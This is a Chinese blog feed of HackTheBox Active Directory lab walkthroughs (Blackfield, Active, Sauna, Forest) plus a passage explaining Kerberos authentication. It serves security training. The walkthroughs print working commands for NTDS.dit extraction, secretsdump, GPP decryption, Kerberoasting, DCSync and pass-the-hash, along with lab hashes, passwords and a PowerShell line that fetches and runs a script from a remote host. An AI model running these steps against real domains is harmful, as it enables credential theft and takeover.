+<p>此时我们知道了我们拥有SEBackupPrivilege 权限，所以我们可以通过使用签名的二进制文件创建 NTDS.dit 的卷影副本来完成diskshadow 首先，创建一个名为 script.txt 的文本文件，其中包含以下内容：</p>
+<pre><code>{
+set context persistent nowriters
+set metadata c:\windows\system32\spool\drivers\color\example.cab
+set verbose on
+begin backup
+add volume c: alias mydrive
+ 
+create
+
+expose %mydrive% w:
+end backup
+}
+</code></pre>
+<p>然后执行diskshadow 并使用脚本文件作为其输入，接着我们可以使用这个https://github.com/giuliano108/SeBackupPrivilege提供的两个dll文件，并按照其提供的步骤操作，来复制创建的 NTDS.dit 卷影副本</p>
+<pre><code>*Evil-WinRM* PS C:\Users\svc_backup\music&gt;diskshadow /s script.txt
+*Evil-WinRM* PS C:\Users\svc_backup\music&gt;upload SeBackupPrivilegeCmdLets.dll c:\users\svc_backup\music\
+*Evil-WinRM* PS C:\Users\svc_backup\music&gt;upload SeBackupPrivilegeUtils.dll c:\users\svc_backup\music\
+*Evil-WinRM* PS C:\Users\svc_backup\music&gt;Copy-FileSeBackupPrivilege w:\windows\NTDS\ntds.dit c:\users\svc_backup\music\ntds.dit -Overwrite
+*Evil-WinRM* PS C:\Users\svc_backup\music&gt; reg save HKLM\SYSTEM c:\users\svc_backup\music\system.hive 
+*Evil-WinRM* PS C:\Users\svc_backup\music&gt;download ntds.dit
+*Evil-WinRM* PS C:\Users\svc_backup\music&gt;download system.hive
+</code></pre>
+<p>我现在可以使用<code>Evil-WinRM’s</code>下载功能下载 NTDS.dit 和 system.hive 文件。然后，使用<code>Impacket’s</code>secretsdump.py 解析 NTDS.dit：</p>
+<pre><code>secretsdump.py LOCAL -system system.hive -ntds ntds.dit -outputfile secretsdump.out
+cat secretsdump.out
+</code></pre>
+<pre><code>Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
+
+[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
+[*] Reading and decrypting hashes from ntds.dit
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DC01$:1000:aad3b435b51404eeaad3b435b51404ee:9e3d10cc537937888adcc0d918813a24:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
+audit2020:1103:aad3b435b51404eeaad3b435b51404ee:4c67bfbc7834b2f39fae7138f717dcbd:::
+support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
+[..SNIP..]
+</code></pre>
+<h2 id="使用wmiexec进行pth">使用wmiexec进行PTH</h2>
+<p>通过上面secretsdump分析的结果，我们可以看到管理员的hash ，那么现在我们可以通过wmiexec.py通过hash来登录到管理员账户</p>
+<pre><code>wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee blackfield.LOCAL/administrator@10.10.10.192
+</code></pre>
+<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231206180854118.png" alt="image-20231206180854118" loading="lazy"></figure>
+<h2 id="总结">总结</h2>
+<p>这是一台困难难度的靶机 做的过程中还看了官方的WP。首先是通过SMB共享的到共享目录 、在目录下面得到了一些类似于用户名的文件，使用kerberos枚举 得到了存在的三个用户名 对三个用户名尝试进行AS-REP Roasting 最后得到并破解了support的账号密码 通过pyhthon版的blood得到了域的分析图，后来发现 audi2020用户的密码可以被support用户修改 通过修改密码实现访问以前没有访问的smb共享。在里面发现了lsass文件，提取出了密码，通过hash实现了登录。最后提升权限那里 一开始真的没有思路 最后看官方的WP 和南城夕雾师傅的WP 发现该用户具有SEBackupPrivilege 权限，然后我们通过滥用备份操作员的角色下载了NTDS.dt文件的副本并从中提取到了管理员的NT哈希,最后通过wmiexec.py进行PTH拿到了管理员shell。这台靶机还是挺有深度的，相较于之前的难度有了一定的提升。通过这台靶机 也反应了我对于blood的一些使用 还不太熟练。以及渗透手法 还不够多。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Active Directory 101-Active]]></title>
+        <id>https://wghahaha.github.io/post/active/</id>
+        <link href="https://wghahaha.github.io/post/active/">
+        </link>
+        <updated>2023-12-05T07:09:37.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="active">Active</h1>
+<h2 id="前言">前言</h2>
+<p>AD域的第三台靶机 用到了一些前面没有用到的技术。</p>
+<h2 id="信息收集">信息收集</h2>
+<pre><code>Nmap scan report for 10.10.10.100
+Host is up (0.41s latency).
+Not shown: 65512 closed ports
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-10-10 14:36:34Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5722/tcp  open  msrpc         Microsoft Windows RPC
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49152/tcp open  msrpc         Microsoft Windows RPC
+49153/tcp open  msrpc         Microsoft Windows RPC
+49154/tcp open  msrpc         Microsoft Windows RPC
+49155/tcp open  msrpc         Microsoft Windows RPC
+49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49158/tcp open  msrpc         Microsoft Windows RPC
+49165/tcp open  msrpc         Microsoft Windows RPC
+49170/tcp open  msrpc         Microsoft Windows RPC
+49171/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+</code></pre>
+<p>得到一堆信息 开放了端口 尝试进行SMB枚举。</p>
+<h3 id="smb枚举">SMB枚举</h3>
+<pre><code>smbmap -H 10.10.10.100
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231205142255617.png" alt="image-20231205142255617" loading="lazy"></figure>
+<p>得到目标一共有7个SMB共享服务 其中可以匿名访问的为<strong>Replication</strong></p>
+<p>访问该目录</p>
+<pre><code> smbclient //10.10.10.100/Replication -U &quot;&quot;%&quot;&quot;
+</code></pre>
+<p>最后发现 SVC_TGS用户的账号和密码</p>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231205142522259.png" alt="image-20231205142522259" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231205142552158.png" alt="image-20231205142552158" loading="lazy"></figure>
+<h2 id="gpp密码解密">GPP密码解密</h2>
+<p>每当创建新的组策略首选项 (GPP) 时，都会在 SYSVOL 共享中创建一个带有该配置数据的 xml 文件，包括与 GPP 关联的任何密码。为安全起见，Microsoft将密码存储为<code>cpassword</code>. 但随后微软在 MSDN 上<a href="https://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be.aspx">公布了密钥！</a>，微软在 2014 年发布了一个补丁，阻止管理员将密码输入 GPP。但是该补丁对已经存在的这些易破解密码没有任何作用。</p>
+<p>由于密钥已经知道了 所以可以直接解密。</p>
+<pre><code>gpp-decrypt &quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot;
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231205142901856.png" alt="image-20231205142901856" loading="lazy"></figure>
+<p>得到了SVC_TGS的密码  GPPstillStandingStrong2k18 。</p>
+<p>可以通过smb协议登录机器了。</p>
+<p>将桌面上的user.txt下载下来就可以了。</p>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231205143333781.png" alt="image-20231205143333781" loading="lazy"></figure>
+<h2 id="kerberoasting">Kerberoasting</h2>
+<p>其实我一开始还不太熟悉 不知道用这个攻击 但是看提示问我 哪个账户容易受到Kerberoasting攻击，那么这里应该就是用这种方法了。这种攻击发生在TGS_REQ的阶段，KDC的TGS服务返回一个由服务Hash加密的STG给客户端。由于该ST是用服务Hash进行加密的，所以客户端拿到hash后可以进行离线暴破。有可能可以暴破出字典。</p>
+<h3 id="请求服务票据">请求服务票据</h3>
+<p>这里用的是impacket请求 使用Rubeus或者mimikat应该都是可以的。</p>
+<pre><code>GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231205144752165.png" alt="image-20231205144752165" loading="lazy"></figure>
+<h3 id="离线破解">离线破解</h3>
+<p>将票据内容保存下来使用工具破解。</p>
+<p>我是直接复制下来创建一个文件 如果是mimikatz我记得是没法直接复制的。然后使用john破解 我感觉这个比hashcat快一些。</p>
+<p>字典才用的是流传的rockyou字典。</p>
+<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231205145054909.png" alt="image-20231205145054909" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231205145103531.png" alt="image-20231205145103531" loading="lazy"></figure>
+<p>成功破解出密码为   <strong>Ticketmaster1968</strong></p>
+<pre><code>wmiexec.py administrator:Ticketmaster1968@10.10.10.100   
+</code></pre>
+<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231205145513572.png" alt="image-20231205145513572" loading="lazy"></figure>
+<p>成功拿到域管权限。</p>
+<h2 id="总结">总结</h2>
+<p>这台靶机的还是比较轻松的，思路大概就是通过前期一个SMB服务可以实现匿名访问 然后发现了带有域内账号密码的的文件，通过公开的密钥将其密码破解了出来。这一步得到了域内普通用户的权限，后面通过Kerberoasting攻击得到域管的hash通过离线破解的方式可以得到密码得到域管权限。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Active Directory 101-Sauna]]></title>
+        <id>https://wghahaha.github.io/post/sauna/</id>
+        <link href="https://wghahaha.github.io/post/sauna/">
+        </link>
+        <updated>2023-12-04T08:40:37.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="sauna">Sauna</h1>
+<h2 id="前言">前言</h2>
+<p>AD域系列的第二台靶机 思路我感觉和上一台靶机有很多相似的地方。</p>
+<h2 id="信息收集">信息收集</h2>
+<p>端口扫描</p>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231204145708414.png" alt="image-20231204145708414" loading="lazy"></figure>
+<p>那么前期信息收集的就有</p>
+<pre><code>53尝试DNS区域传输
+80端口风险传输方式trace
+88   kerber枚举
+135  rpc的枚举
+389  ldap枚举
+</code></pre>
+<h3 id="ldap枚举">ldap枚举</h3>
+<pre><code>nmap --script &quot;ldap*&quot; -p 389 10.10.10.175
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231204145937845.png" alt="image-20231204145937845" loading="lazy"></figure>
+<p>通过访问80端口的http页面，找到了如下姓名</p>
+<pre><code>Fergus Smith
+Shaun Coins
+Hugo Bear
+Steven Kerb
+Bowie Taylor
+Sophie Driver
+</code></pre>
+<p>然后又进行了DNS区域传输  SMB枚举都没有得到什么有用的东西。</p>
+<h3 id="kerbrute枚举">kerbrute枚举</h3>
+<p>通过收集的东西写了一个字典</p>
+<pre><code>hugo.smith
+hugosmith
+hsmith
+smith.hugo
+h.smith
+</code></pre>
+<pre><code>kerbrute_linux_amd64 userenum --dc 10.10.10.175 -d egotistical-bank.local user
+</code></pre>
+<h2 id="as-rep-roasting">AS-REP Roasting</h2>
+<p>后面又通过一些域用户枚举 最后得到了一个用户没有开启预认证操作 所以可以直接得到TGT。</p>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231204150420590.png" alt="image-20231204150420590" loading="lazy"></figure>
+<h2 id="evil-winrm">evil winrm</h2>
+<p>解密出来了后就可以得到密码。由于开放了5985端口 使用 evil winrm进行一个连接。</p>
+<pre><code>evil-winrm -u fsmith -p Thestrokes23 -i 10.10.10.175
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231204150531213.png" alt="image-20231204150531213" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231204150634110.png" alt="image-20231204150634110" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231204150820943.png" alt="image-20231204150820943" loading="lazy"></figure>
+<p>这里可以看到还有一个svc用户。由于这里的权限原因所以可以通过读取注册表来获取密码。</p>
+<h2 id="读注册表获取用户明文密码">读注册表获取用户明文密码</h2>
+<pre><code>reg.exe query &quot;HKLM\software\microsoft\windows nt\currentversion\winlogon&quot;
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231204151805586.png" alt="image-20231204151805586" loading="lazy"></figure>
+<p>指出了用户名和明文密码 。</p>
+<h2 id="blood信息收集">Blood信息收集</h2>
+<pre><code>evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
+</code></pre>
+<p>首先使用这个登录到新的用户中去。</p>
+<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231204155113583.png" alt="image-20231204155113583" loading="lazy"></figure>
+<p>上传blood。并执行</p>
+<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231204155817229.png" alt="image-20231204155817229" loading="lazy"></figure>
+<p>然后将其下载下来</p>
+<figure data-type="image" tabindex="10"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231204155943883.png" alt="image-20231204155943883" loading="lazy"></figure>
+<figure data-type="image" tabindex="11"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231204155957654.png" alt="image-20231204155957654" loading="lazy"></figure>
+<p>然后导入。</p>
+<p>通过分析可通过DCsync机械能攻击域控</p>
+<figure data-type="image" tabindex="12"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231204162436800.png" alt="image-20231204162436800" loading="lazy"></figure>
+<h2 id="dcsync">DCsync</h2>
+<pre><code>secretsdump.py 'svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'
+</code></pre>
+<figure data-type="image" tabindex="13"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231204162703491.png" alt="image-20231204162703491" loading="lazy"></figure>
+<p>得到hash值 使用wmi获取管理员shell。</p>
+<figure data-type="image" tabindex="14"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231204162844461.png" alt="image-20231204162844461" loading="lazy"></figure>
+<p>psexe可以获取system shell。</p>
+<figure data-type="image" tabindex="15"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231204163033146.png" alt="image-20231204163033146" loading="lazy"></figure>
+<h2 id="总结">总结</h2>
+<p>通过对服务进行枚举得到了hsmith用户 然后使用AS-REP Roasting 技术得到初步的TGT 登陆进去发现有其他用户 通过读取注册表信息得到明文的账号密码 登录上svc用户。上传blood得到 分析发现可进行DCsync攻击域控。最后攻击成功得到管理员的hash 后面可通过wmi或psexe得到管理员shell</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Active Directory 101-Forest]]></title>
+        <id>https://wghahaha.github.io/post/active-directory-101-1/</id>
+        <link href="https://wghahaha.github.io/post/active-directory-101-1/">
+        </link>
+        <updated>2023-12-04T04:16:27.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="forest">Forest</h1>
+<h2 id="前言">前言</h2>
+<p>学了一段时间的域渗透了，最近开了一个HTB的会员（老贵了)。想的是玩一下他那个Active Directory 101系列的靶机。这是第一台靶机 Forest后面有时间的话再玩一下那个cloud系列的云靶机。</p>
+<h2 id="信息收集">信息收集</h2>
+<p>还是正常的扫描端口</p>
+<pre><code>nmap -sC -sV -p- 10.10.10.161 
+</code></pre>
+<p>扫描得到端口信息</p>
+<p>通过扫描得到端口开放信息中有<strong>Kerberos</strong>   <strong>LDAP</strong>   <strong>SMB</strong>  <strong>WInrm</strong>   <strong>RPC</strong>  主要这些敏感服务端口</p>
+<h4 id="kerberos用户枚举">Kerberos用户枚举</h4>
+<pre><code>kerbrute_linux_amd64 userenum --dc 10.10.10.161 -d htb.local 字典地址
+</code></pre>
+<p>枚举到了 admin 用户</p>
+<h4 id="rpc用户枚举">RPC用户枚举</h4>
+<pre><code>rpcclient -U &quot;&quot; 10.10.10.161       建立连接 
+enumdomusers                       枚举用户
+</code></pre>
+<h4 id="ldap用户枚举">Ldap用户枚举</h4>
+<pre><code>ldapsearch -x -b &quot;DC=htb,DC=local&quot;  -s base -h 10.10.10.161
+</code></pre>
+<pre><code>经过对枚举结果的筛选后发现如下用户名
+sebastien
+lucinda
+svc-alfresco
+andy
+mark
+santi
+</code></pre>
+<p>在通过kerbrute 枚举得到用户确实存在</p>
+<h2 id="as-rep-roasting">AS-REP Roasting</h2>
+<p>因为在设置svc-alfresco用户后，该用户不可以开预认证，因此我们可以直接拿到其TGT</p>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231204114043256.png" alt="image-20231204114043256" loading="lazy"></figure>
+<p>将这段hash保存保存到本地文件中使用john暴破出来。</p>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231204114423092.png" alt="image-20231204114423092" loading="lazy"></figure>
+<h2 id="winrm">WINRM</h2>
+<p>由于开放了WINRM服务端口可以通过 evil winrm进行登录。</p>
+<pre><code>evil-winrm -u svc-alfresco -p s3rvice -i 10.10.10.161
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231204115118559.png" alt="image-20231204115118559" loading="lazy"></figure>
+<h2 id="blood信息收集">Blood信息收集</h2>
+<p>登录进去后 可 通过上传blood确定攻击的路径。</p>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231204115333208.png" alt="image-20231204115333208" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231204115646092.png" alt="image-20231204115646092" loading="lazy"></figure>
+<h2 id="滥用writedacl-权限进行dcsync攻击实现权限提升">滥用writeDACL 权限进行DCsync攻击实现权限提升</h2>
+<p>通过搜索“svc-alfresco”用户，我发现实际上该用户属于 Account Operators 组，该组是AD中的特权组之一，该组的成员可以创建和管理该域中的用户和组并为其设置权限，也可以在本地登录域控制器。但是，不能更改属于Administrators或Domain Admins组的账号，也不能更改这些组。</p>
+<p>svc-alfresco 到 Domain Admins 的路径，发现exchange windows permission组完全信任Account Operators 组，因此我们可以利用Account Operators 组的权限创建一个新用户，然后把他添加到exchange windows permission组，这样我们就可以对HTB.LOCAL进行一些操作了，我们看到exchange windows permission组的成员对htb.local用有writeDACL权限， 然后我们可以利用我们新添加的用户对HTB.LOCAL的 writeDACL权限进行恶意利用，进而实现权限提升.</p>
+<p>后面的操作主要集中位创建一个用户然后利用缺陷 将他添加到不同的组中</p>
+<pre><code>net user test123  test123! /add /domain 
+net group      #该命令的结果中找到了Exchange Windows Permissions组
+net group 'Exchange Windows Permissions' test123  /add /domain 
+net localgroup   #在该命令的结果中发现了Remote Management Users组 
+net localgroup 'Remote Management Users' test123  /add
+</code></pre>
+<p>然后登录到使用创建的用户登录。</p>
+<pre><code>python -m http.server 80
+</code></pre>
+<pre><code>evil-winrm -u test123 -p test123！ -i 10.10.10.161
+</code></pre>
+<pre><code>powershell -nop -exec bypass -c &quot;iex(New-Object  Net.webclient).downloadstring('http://10.10.16.12/PowerView.ps1')&quot;
+</code></pre>
+<pre><code>Add-DomainObjectAcl -PrincipalIdentity 'test123' -TargetIdentity 'DC=htb,DC=local' -Rights DCSync
+</code></pre>
+<p>此时，我们就可以使用升级后的权限，我们可以使用secretsdump.py工具执行 DCSync 以转储“管理员”用户的 NTLM 哈希</p>
+<pre><code>secretsdump.py test123:'test123!'@10.10.10.161
+
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
+...
+...
+...
+[*] Cleaning up...
+</code></pre>
+<p>得到管理员的hash值就可以使用wmiexec直接登录到用户上去。</p>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231204120841570.png" alt="image-20231204120841570" loading="lazy"></figure>
+<h2 id="总结">总结</h2>
+<p>通过对于开放服务的枚举得到了 svc-alfresco 用户。通过john破译出了密码。使用账号密码进行了登录  使用blood进行了一波信息收集。经过分析后发现当前用户所处组为Account Operators 组，该组被Exchange Windows Permissions组完全信任，所以我们新建了用户并将其添加到了该用户组，又因为，Exchange Windows Permissions组对HTB.LOCAL有WriteDACL权限，我们对其使用了DCsync攻击，成功获取到了管理员的hash，最终通过wmiexec哈希传递拿到了管理员权限。</p>
+<h2 id="参考链接">参考链接</h2>
+<p>https://www.freebuf.com/author/%E5%8D%97%E5%9F%8E%E5%A4%95%E9%9B%BEhacker</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Kerberos协议分析]]></title>
+        <id>https://wghahaha.github.io/post/kerberos-xie-yi-fen-xi/</id>
+        <link href="https://wghahaha.github.io/post/kerberos-xie-yi-fen-xi/">
+        </link>
+        <updated>2023-11-30T05:55:43.000Z</updated>
+        <content type="html"><![CDATA[<p>很久以前学过的东西 但是感觉当时学的比较零散 。找了篇文章重新学习学习</p>
+<p>文章学习搬运于 <a href="https://xz.aliyun.com/u/24564"><strong>饼干屑小鬼</strong></a>师傅的文章</p>
+<h2 id="前言">前言</h2>
+<p>Kerberos协议是一种网络认证协议，其设计目标是通过密钥系统为客户/服务器应用程序提供强大的认证服务。在令牌窃取攻击中，该攻击的核心就是Kerberos协议。Kerberos协议要解决的实际上就是一个身份认证的问题，顾名思义，<strong>当一个客户机去访问一个服务器的某服务时，服务器如何判断该客户机是否有权限来访问本服务器上的服务，同时保证在该过程中的通讯内容即便被拦截或者被篡改也不影响整个通讯的安全性</strong>。</p>
+<h2 id="相关概念">相关概念</h2>
+<pre><code>(1)Client:访问服务的客户机
+
+(2)Server:提供服务的服务器
+
+(3)KDC(Key Distribution Center):密钥分发中心 
+
+(4)KDC中分成两个部分:Authentication Service和Ticket Granting Service
+    Authentication Service(AS):身份验证服务
+    Ticket Granting Service(TGS):票据授予服务
+
+    AS和TGS如下：
+
+    Authentication Service：AS的作用就是验证Client端的身份，验证通过之后，AS就会给TGT票据(Ticket Granting Ticket)给Client.
+    Ticket-granting cookie(TGC):存放用户身份认证凭证的cookie，在浏览器和CAS Server间通讯时使用，是CAS Server用来明确用户身份的凭证。TGT封装了TGC值以及此Cookie值对应的用户信息.
+    Ticket-granting ticket(TGT):TGT对象的ID就是TGC的值，在服务器端，通过TGC查询TGT.
+
+
+    Ticket Granting Service(TGS)：TGS的作用是通过AS发送给Client的TGT换取访问Server端的ST(Server Ticket)给Client.
+    SEerver Ticket(ST):ST服务票据，由TGS服务发布.
+
+
+(5)Active Directory(AD):活动目录
+
+(6)Domain Controller(DC):域控制器
+
+(7)Ticket-granting cookie(TGC):存放用户身份认证凭证的cookie，在浏览器和CAS Server间通讯时使用，是CAS Server用来明确用户身份的凭证。TGT封装了TGC值以及此Cookie值对应的用户信息.
+
+(8)Ticket-granting ticket(TGT):TGT对象的ID就是TGC的值，在服务器端，通过TGC查询TGT
+</code></pre>
+<p>kerberos认证的形象过程</p>
+<pre><code>疫情期间，小明去拿一个重要包裹，由于包裹是来自海外的，所以需要严格登记：
+（1）拿包裹的时候，为了证明自己是合法公民，小明先把身份证给工作人员
+（2）快递点的身份认证系统通过身份认证后，给小明一张身份认证通过证明
+（3）小明拿着身份认证通过证明，来到快递收发处等一张拿快递的号码牌
+（4）售票处给了张号码牌
+（5）小明拿着号码牌拿快递去了
+（6）在拿快递时，小明拿出自己的身份认证材料给快递点的工作人员，工作人员向快递公司的数据管理中心发了消息，问问小明是不是有包裹要拿
+（7）数据管理中心将小明的快递单号，身份信息等发了过来
+（8）工作人员将数据管理中心发来的信息与小明给的材料对比，得出小明是好公民，有一个重要包裹，于是带着小明来到仓库的金库，把装有老魔杖的包裹给了小明
+</code></pre>
+<h2 id="认证过程">认证过程</h2>
+<p><code>Kerberos认证</code>中有两个问题</p>
+<pre><code>（1）AS如何验证Client的身份？
+    AS与Client之间的认证使用AS_REQ&amp;AS_REP模块 
+（2）Client如何获取ST？
+    Client与TGS之间认证使用TGS_REQ&amp;TGS_REP模块
+</code></pre>
+<p>因为<code>kerberos</code>协议的实现，需要三方的参与，分别如下：</p>
+<pre><code>1.client 访问服务的客户机
+2.Server 提供服务的服务器
+3.KDC(Key Distribution Center) 密钥分发中心 
+    KDC服务会默认安装在一个域的域控中，所以可以直接理解为，AD与KDC均为域控制器,KDC服务框架中包含一个KRBTGT账户，它是在创建域时系统自动创建的一个账号。
+</code></pre>
+<p>其中：<code>KDC</code>中有<code>AS认证服务</code>与<code>TGS认证服务</code></p>
+<pre><code>(1)Client向KDC的AS认证服务请求TGT票据=&gt;AS_REQ
+(2)Client通过认证后，KDC将会发放TGT票据=&gt;AS_REP
+(3)Client带上TGT票据，向TGS认证服务请求ST服务票据=&gt;TGS_REQ
+(4)Client通过了TGS认证服务后，TGS将会发放ST服务票据=&gt;TGS_REP
+(5)Client使用ST服务票据向服务端请求服务=&gt;AP_REQ
+(6)Server拿到PAC询问KDC，Client是否有权限
+(7)KDC将Client的权限信息发给Server
+(8)Server根据KDC返回的权限信息对比，判断Client是否有权限访问该服务，并把结果返回给Client=&gt;AP_REP
+</code></pre>
+<p>注：（6）（7）两步不一定发生，需要将目标主机配置为验证KDC PAC验证</p>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231124114702215.png" alt="image-20231124114702215" loading="lazy"></figure>
+<pre><code>域中每个用户的Ticket都是由krbtgt的密码Hash来计算生成的,因此只要我们拿到了krbtgt的密码Hash,就可以随意伪造Ticket,进而使用Ticket登陆域控制器,使用krbtgt用户hash生成的票据被称为Golden Ticket,此类攻击方法被称为票据传递攻击
+</code></pre>
+<p>先前提到两个问题，第一个问题</p>
+<pre><code>（1）AS如何验证Client的身份？
+    AS与Client之间的认证使用AS_REQ&amp;AS_REP模块
+</code></pre>
+<h3 id="as_reqas_rep">AS_REQ&amp;AS_REP</h3>
+<p><strong>分析AS-REQ的数据包</strong></p>
+<p><code>AS-REQ</code>：当某个域用户试图访问域中的某个服务，于是输入用户名和密码，本机<code>Kerberos</code>服务会向<code>KDC</code>的<code>AS</code>认证服务发送一个<code>AS-REQ</code>认证请求。该请求包中包含：<code>请求用户名</code>，<code>客户端主机名</code>，<code>加密类型</code>和<code>Autherticator(用户NTLM Hash加密的时间戳)</code>以及一些信息。</p>
+<p><code>Client</code>向<code>KDC</code>发起<code>AS_REQ</code>请求凭据是用户hash加密的时间戳。请求凭据放在<code>PA_DATA</code>里面</p>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231124115820946.png" alt="image-20231124115820946" loading="lazy"></figure>
+<pre><code>Pvno  kerberos协议版本号：05（Hex）
+5MSG-TYPE 类型 AS_REQ对应（krb-as-req）0a（Hex）
+PA-DATA  预认证信息数据 一个列表，包含若干个认证消息用于认证，每个认证消息有type和value。
+AS_REQ 阶段主要用到的有两个
+　　1.ENC_TIMESTAMP
+　　这个是预认证，就是用用户hash加密时间戳，作为value 发送给AS服务器。然后AS服务器那边有用户hash，使用用户hash进行解密，获得时间戳，如果能解密，且时间戳在一定的范围内，则证明认证通过。
+　　2.PA_PAC_REQUEST
